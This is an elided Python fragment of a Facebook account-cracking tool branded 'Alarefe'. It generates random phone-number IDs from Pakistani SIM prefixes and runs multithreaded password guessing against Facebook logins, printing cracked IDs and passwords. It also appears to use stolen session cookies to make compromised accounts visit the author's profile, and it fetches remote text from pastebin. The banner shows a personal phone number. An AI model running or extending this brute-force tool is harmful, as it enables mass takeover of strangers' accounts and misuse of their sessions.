...
os.system('am start https://www.facebook.com/profile.php?id=100077219978643')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100077219978643&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/0P16HxZZ").text
...
\033[1;37m══════════════════════════════════════════════════
AUTHOR   :   Alarefe
  FACEBOOK :   Mohammed Alarefe
  GITHUB    :   #####
  LIFE STATUS  :  Alarefe
  friends   : [Alarefe]
  TOOL STATUS :  No Free
  phone number : 0914348741                        ;37m══════════════════════════════════════════════════"""
clear()
os.system("xdg-open https://www.facebook.com/profile.php?id=100077219978643")
xxxx = str(len(ugen))
...
def follow(ses,coki):
    ...
    r = sop(ses.get('https://www.facebook.com/profile.php?id=100077219978643', cookies={'cookie': coki}).text, 'html.parser')
...
def pass1():
    ...
    print('\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m21892, 21894, 21891,21893 97m====================================================') 
...
def pass3():
    ...
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m1000 ,2000, 3000, 50000, 100000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[Alarefe-OK😁😂]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91m[Alarefe-CP😥🥺]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Alarefe] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
